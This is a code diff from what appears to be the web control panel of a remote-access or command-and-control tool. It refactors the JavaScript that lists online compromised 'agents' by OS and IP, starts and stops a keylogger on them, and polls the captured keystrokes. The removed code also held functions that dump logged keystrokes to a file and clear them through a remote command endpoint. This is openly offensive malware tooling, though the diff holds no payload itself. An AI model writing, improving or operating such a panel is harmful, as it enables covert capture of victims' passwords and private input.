@@ -1054,40 +1054,43 @@ function updateKeyloggerAgents() {
             // Store current selection
             const currentSelection = select.value;
 
-            // Clear current options except the first one
-            while (select.options.length > 1) {
-                select.remove(1);
-            }
+            // Clear current options
+            select.innerHTML = '<option value="">Select an agent</option>';
 
-            // Add online agents
-            data.forEach(agent => {
-                if (isAgentActive(agent.last_seen)) {
-                    const option = document.createElement('option');
-                    option.value = agent.id;
-                    option.text = `${agent.alias || `Agent_${agent.id}`} (${agent.os_type || 'Unknown'} | ${agent.ip || 'Unknown IP'})`;
-                    select.add(option);
-                }
-            });
-
-            // Restore previous selection if agent still exists
-            if (currentSelection && select.querySelector(`option[value="${currentSelection}"]`)) {
-                select.value = currentSelection;
-            }
-
-            // Update status if no agents are available
-            if (select.options.length <= 1) {
+            // Add only online agents
+            const onlineAgents = data.filter(agent => isAgentActive(agent.last_seen));
+            
+            if (onlineAgents.length === 0) {
                 const option = document.createElement('option');
                 option.text = 'No agents available';
                 option.disabled = true;
                 select.add(option);
+                return;
+            }
+
+            onlineAgents.forEach(agent => {
+                const option = document.createElement('option');
+                option.value = agent.id;
+                option.text = `${agent.alias || `Agent_${agent.id}`} (${agent.os_type || 'Unknown'} | ${agent.ip || 'Unknown IP'})`;
+                select.add(option);
+            });
+
+            // Restore previous selection if agent still exists and is online
+            if (currentSelection && select.querySelector(`option[value="${currentSelection}"]`)) {
+                select.value = currentSelection;
+            } else {
+                // If previous selection is not available, reset keylogger state
+                selectedKeyloggerAgent = null;
+                keyloggerActive = false;
+                updateKeyloggerStatus();
+                stopLogUpdates();
             }
         })
         .catch(error => {
             console.error('Error updating keylogger agents:', error);
             const select = document.getElementById('keylogger-agent-select');
             if (select) {
-                // Clear and show error
-                while (select.options.length > 1) select.remove(1);
+                select.innerHTML = '<option value="">Select an agent</option>';
                 const option = document.createElement('option');
                 option.text = 'Error loading agents';
                 option.disabled = true;
@@ -1119,13 +1122,22 @@ function startKeylogger() {
         if (data.error) {
             throw new Error(data.error);
         }
-        keyloggerActive = true;
-        updateKeyloggerStatus();
-        startLogUpdates();
-        document.getElementById('keylogger-output').textContent = `Started keylogger for ${agentName}\n`;
+        if (data.success) {
+            keyloggerActive = true;
+            updateKeyloggerStatus();
+            startLogUpdates();
+            const output = document.getElementById('keylogger-output');
+            if (output) {
+                output.textContent = `Started keylogger for ${agentName}\n`;
+            }
+        } else {
+            throw new Error(data.message || 'Failed to start keylogger');
+        }
     })
     .catch(error => {
         alert(`Error starting keylogger: ${error.message}`);
+        keyloggerActive = false;
+        updateKeyloggerStatus();
     });
 }
 
@@ -1148,108 +1160,22 @@ function stopKeylogger() {
         if (data.error) {
             throw new Error(data.error);
         }
-        keyloggerActive = false;
-        updateKeyloggerStatus();
-        stopLogUpdates();
-        document.getElementById('keylogger-output').textContent += '\nKeylogger stopped\n';
+        if (data.success) {
+            keyloggerActive = false;
+            updateKeyloggerStatus();
+            stopLogUpdates();
+            const output = document.getElementById('keylogger-output');
+            if (output) {
+                output.textContent += '\nKeylogger stopped\n';
+            }
+            selectedKeyloggerAgent = null;  // Clear selected agent
+        } else {
+            throw new Error(data.message || 'Failed to stop keylogger');
+        }
     })
     .catch(error => {
         alert(`Error stopping keylogger: ${error.message}`);
     });
-}
-
-function downloadLogs() {
-    if (!selectedKeyloggerAgent) {
-        alert('No agent selected');
-        return;
-    }
-
-    fetch('/api/send_command', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-            session_id: selectedKeyloggerAgent,
-            command: 'keylogger dump'
-        })
-    })
-    .then(response => response.json())
-    .then(data => {
-        if (data.error) {
-            throw new Error(data.error);
-        }
-        
-        const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
-        const filename = `keylogger_agent${selectedKeyloggerAgent}_${timestamp}.txt`;
-        
-        const blob = new Blob([data.output || ''], { type: 'text/plain' });
-        const url = window.URL.createObjectURL(blob);
-        const a = document.createElement('a');
-        a.href = url;
-        a.download = filename;
-        document.body.appendChild(a);
-        a.click();
-        document.body.removeChild(a);
-        window.URL.revokeObjectURL(url);
-    })
-    .catch(error => {
-        alert(`Error downloading logs: ${error.message}`);
-    });
-}
-
-function clearLogs() {
-    if (!selectedKeyloggerAgent) {
-        alert('No agent selected');
-        return;
-    }
-
-    if (!confirm('Are you sure you want to clear the logs?')) {
-        return;
-    }
-
-    fetch('/api/send_command', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-            session_id: selectedKeyloggerAgent,
-            command: 'keylogger clear'
-        })
-    })
-    .then(response => response.json())
-    .then(data => {
-        if (data.error) {
-            throw new Error(data.error);
-        }
-        document.getElementById('keylogger-output').textContent = 'Logs cleared\n';
-    })
-    .catch(error => {
-        alert(`Error clearing logs: ${error.message}`);
-    });
-}
-
-function updateKeyloggerStatus() {
-    const indicator = document.querySelector('.status-indicator');
-    const statusText = document.querySelector('.status-text');
-    
-    if (keyloggerActive) {
-        indicator.classList.add('active');
-        statusText.textContent = 'Running';
-    } else {
-        indicator.classList.remove('active');
-        statusText.textContent = 'Stopped';
-    }
-}
-
-function startLogUpdates() {
-    stopLogUpdates();
-    fetchLatestLogs(); // Immediate update
-    logUpdateInterval = setInterval(fetchLatestLogs, 5000);
-}
-
-function stopLogUpdates() {
-    if (logUpdateInterval) {
-        clearInterval(logUpdateInterval);
-        logUpdateInterval = null;
-    }
 }
 
 function fetchLatestLogs() {
@@ -1269,9 +1195,13 @@ function fetchLatestLogs() {
             throw new Error(data.error);
         }
         const output = document.getElementById('keylogger-output');
-        if (output && data.output) {
-            output.textContent = data.output;
-            output.scrollTop = output.scrollHeight;
+        if (output) {
+            if (data.success && data.output) {
+                output.textContent = data.output;
+                output.scrollTop = output.scrollHeight;
+            } else if (!data.success) {
+                throw new Error(data.message || 'Failed to fetch logs');
+            }
         }
     })
     .catch(error => {
@@ -1279,7 +1209,30 @@ function fetchLatestLogs() {
         stopLogUpdates();
         keyloggerActive = false;
         updateKeyloggerStatus();
+        const output = document.getElementById('keylogger-output');
+        if (output) {
+            output.textContent += `\nError: ${error.message}\n`;
+        }
     });
+}
+
+function updateKeyloggerStatus() {
+    const indicator = document.querySelector('.status-indicator');
+    const statusText = document.querySelector('.status-text');
+    const startButton = document.querySelector('[onclick="startKeylogger()"]');
+    const stopButton = document.querySelector('[onclick="stopKeylogger()"]');
+    
+    if (keyloggerActive) {
+        indicator?.classList.add('active');
+        if (statusText) statusText.textContent = 'Running';
+        if (startButton) startButton.disabled = true;
+        if (stopButton) stopButton.disabled = false;
+    } else {
+        indicator?.classList.remove('active');
+        if (statusText) statusText.textContent = 'Stopped';
+        if (startButton) startButton.disabled = false;
+        if (stopButton) stopButton.disabled = true;
+    }
 }
 
 // Initialize keylogger updates when switching to keylogger tab
